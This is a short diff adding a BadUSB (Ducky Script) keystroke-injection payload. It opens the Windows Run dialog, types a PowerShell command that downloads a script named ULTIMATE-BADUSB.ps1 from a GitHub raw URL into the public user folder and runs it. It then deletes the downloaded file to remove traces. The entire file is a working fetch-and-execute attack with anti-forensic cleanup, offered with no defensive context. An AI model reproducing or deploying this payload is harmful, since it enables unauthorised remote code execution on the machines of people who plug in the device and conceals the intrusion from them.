@@ -1,0 +1,11 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING pwsh -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KoosVanDerMerwe/ULT-BADUSB/main/ULTIMATE-BADUSB.ps1' -OutFile 'C:\Users\Public\ULTIMATE-BADUSB.ps1'; Start-Process pwsh -ArgumentList '-File \"C:\Users\Public\ULTIMATE-BADUSB.ps1\"' -NoNewWindow -Wait"
+ENTER
+DELAY 5000
+GUI r
+DELAY 1000
+STRING pwsh -Command "Remove-Item -Path 'C:\Users\Public\ULTIMATE-BADUSB.ps1' -Force"
+ENTER
+DELAY 5000
